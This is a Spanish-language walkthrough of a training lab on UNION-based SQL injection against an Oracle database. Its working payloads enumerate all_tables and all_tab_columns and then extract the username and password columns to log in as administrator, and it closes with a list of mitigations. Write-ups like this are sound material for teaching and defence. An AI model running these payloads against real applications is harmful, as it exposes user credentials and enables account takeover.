Lab 6

SQL Injection attack, listing the database contents on Oracle

Información del laboratorio

Nivel: Practitioner

Tipo de SQLi: UNION-based SQL Injection en Oracle

Objetivo

Enumerar el contenido de la base de datos Oracle para identificar la tabla que contiene credenciales de usuarios y extraer username y password para iniciar sesión como administrador.

Vulnerabilidad

La aplicación no valida el parámetro category, permitiendo inyección de consultas SQL adicionales mediante UNION SELECT.

Procedimiento

Paso 1 – Seleccionar categoría

Se navegó a la categoría Lifestyle y se interceptó la petición.

Paso 2 – Confirmar número de columnas

' UNION SELECT 'abc','def' FROM dual--

Los valores "abc" y "def" aparecieron como productos, confirmando 2 columnas compatibles con UNION.

Paso 3 – Enumerar tablas

' UNION SELECT table_name, NULL FROM all_tables--

Se identificó la tabla de usuarios: USERS_LRTWKH

Paso 4 – Enumerar columnas

' UNION SELECT column_name, NULL 
FROM all_tab_columns 
WHERE table_name='USERS_LRTWKH'--

Columnas relevantes identificadas:

  • USERNAME_ZOWHGC
  • PASSWORD_QUEGN

Paso 5 – Extraer credenciales

' UNION SELECT USERNAME_ZOWHGC, PASSWORD_QUEGN FROM USERS_LRTWKH--

Se extrajo la lista completa de usuarios incluyendo el registro del usuario administrator.

Paso 6 – Login

Se ingresó a My Account utilizando las credenciales extraídas para resolver el laboratorio.

Explicación del payload

' UNION SELECT [columna1], [columna2] FROM [tabla]--
  • ' → cierra la cadena del WHERE original
  • UNION SELECT → combina resultados adicionales
  • NULL → relleno para mantener número de columnas
  • -- → comenta el resto de la consulta

Mitigación recomendada

  • Consultas parametrizadas.
  • Validación estricta de entradas.
  • Principio de mínimo privilegio.
  • Uso de ORMs seguros.
  • Implementación de WAF.
  • Almacenamiento seguro de contraseñas (bcrypt, Argon2).
